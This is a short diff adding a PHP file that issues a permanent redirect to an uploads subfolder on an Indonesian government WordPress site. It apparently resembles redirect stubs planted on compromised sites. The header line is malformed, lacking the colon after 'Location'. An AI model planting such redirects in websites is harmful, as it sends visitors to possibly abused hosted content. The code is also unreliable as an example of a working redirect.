@@ -1,0 +1,4 @@
+<?php
+header("Location https://setda.kapuaskab.go.id/wp-content/uploads/eso/", true, 301);
+exit();
+?>
